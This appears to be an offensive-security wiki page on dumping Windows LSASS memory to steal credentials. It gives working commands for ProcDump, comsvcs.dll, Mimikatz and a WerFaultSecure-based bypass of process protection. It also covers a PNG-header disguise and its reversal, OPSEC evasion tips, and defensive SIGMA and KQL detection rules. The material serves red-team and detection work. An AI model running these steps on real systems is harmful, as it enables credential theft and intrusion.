---
title: LSASS Dumping
permalink: /wiki/concepts/lsass-dumping/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
redirect_from:
- /wiki/offsec-notes/concepts/lsass-dumping/
---

**Category:** Credential Access
**MITRE ATT&CK:** T1003.001 — OS Credential Dumping: LSASS Memory
**Related:** [Mimikatz](/wiki/tools/mimikatz/), [Credential Guard Bypass](/wiki/concepts/credential-guard-bypass/), [Active Directory Attacks](/wiki/concepts/active-directory-attacks/), [Evasion Techniques](/wiki/concepts/evasion-techniques/)

## Overview
LSASS (Local Security Authority Subsystem Service) stores credential material including NT hashes, Kerberos tickets, and (historically) plaintext passwords. On modern systems LSASS runs as PPL (Protected Process Light) and Credential Guard moves secrets to `LsaIso.exe`. Multiple techniques exist to dump LSASS while evading EDR detection.

## Standard Approaches (Noisy / Well-Detected)

### Task Manager
GUI: Task Manager → Processes → lsass.exe → Create Dump File. Trivially detected.

### ProcDump (LOLBin)
```cmd
procdump.exe -ma lsass.exe lsass.dmp
```

### Comsvcs.dll (LOLBin)
```powershell
rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
```

### Mimikatz Direct
```
privilege::debug
sekurlsa::logonpasswords
```
Blocked on PPL-protected LSASS without a kernel-level PPL bypass.

## WER Method (WerFaultSecure) — PPL Bypass via Signed Binary

**Tool:** WSASS (github.com/TwoSevenOneT/WSASS)  
**Requirement:** Local Administrator; Windows 8.1 binary of `WerFaultSecure.exe`

`WerFaultSecure.exe` is a Microsoft-signed binary that runs as PPL (WinTCB level), allowing it to interact with other PPL processes including LSASS. The Windows 8.1 version creates an **unencrypted** minidump, unlike modern versions that encrypt the dump file.

### Procedure
```cmd
# Get LSASS PID
Get-Process lsass | Select-Object Id

# Execute dump (WSASS invokes old WerFaultSecure with PPL privilege)
WSASS.exe "C:\Users\attacker\Downloads\WerFaultSecure.exe" <lsass_pid>

# Files created:
#   proc.png  — unencrypted minidump with PNG header (artifact)
#   proce.png — encrypted dump (auto-deleted)

# Download dump
download proc.png
```

### Recovering the Minidump
The MiniDump header (`MDMP` = `4D 44 4D 50`) is replaced with the PNG header (`89 50 4E 47`) to evade file-type detection. Replace the first 4 bytes to recover the minidump before parsing.

```python
with open('proc.png', 'rb') as f:
    data = f.read()

with open('lsass.dmp', 'wb') as f:
    f.write(b'\x4D\x44\x4D\x50' + data[4:])  # Restore MDMP header
```

### Parse with pypykatz
```bash
pypykatz lsa minidump lsass.dmp
```

**Note:** On Windows 11 with Credential Guard enabled, LSASS no longer holds high-value credentials — see [Credential Guard Bypass](/wiki/concepts/credential-guard-bypass/) for bypass techniques.

## Detection

### Process

| Event | Indicator |
|-------|-----------|
| 4688 / Sysmon 1 | `WSASS.exe` execution with path to WerFaultSecure.exe |
| 4688 | `WerFaultSecure.exe` spawned from non-system path or unusual parent |
| 4688 | `WerFaultSecure.exe` with `/h /pid /tid /file /encfile /cancel /type` args |

### SIGMA (WerFaultSecure outside system paths)
```yaml
title: WerFaultSecure.exe executed outside system paths
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection_image:
    Image|endswith: '\WerFaultSecure.exe'
  filter_system_paths:
    Image|startswith:
      - 'C:\Windows\System32\'
      - 'C:\Windows\SysWOW64\'
  condition: selection_image and not filter_system_paths
level: high
tags:
  - attack.t1003.001
```

### File
- **4663** — WSASS accessing WerFaultSecure process object
- **Sysmon 11** — File created: `proc.png` or `proce.png`
- Anomaly: PNG file >10 MB created by non-image-editing process

**MDE hunting query (large PNG files):**
```kql
DeviceFileEvents
| where Timestamp > ago(30d)
| where tolower(FileName) endswith ".png"
| where FileSize >= 10485760  // 10 MB
| where ActionType in ("FileCreated", "FileRenamed")
| where not(FolderPath startswith "C:\\Program Files" or FolderPath startswith "C:\\Windows")
| project Timestamp, DeviceName, FolderPath, FileName, FileSize, 
          InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by FileSize desc
```

### Summary Event IDs

| Event | Source | Detects |
|-------|--------|---------|
| 4688 / Sysmon 1 | Security / Sysmon | Process creation + command line |
| 4663 | Security | Object access (process handle to LSASS) |
| Sysmon 11 | Sysmon | File creation (proc.png) |

## OPSEC Notes
- Drop WerFaultSecure.exe (old version) to disk before executing WSASS — binary is not in standard path
- PNG header swap reduces file signature detection
- Overwriting the legitimate WerFaultSecure.exe in System32 with old version is another vector but risks system instability

## References
- ipurple.team — "LSASS Dump – Windows Error Reporting" (2025-11-18)
- WSASS — github.com/TwoSevenOneT/WSASS
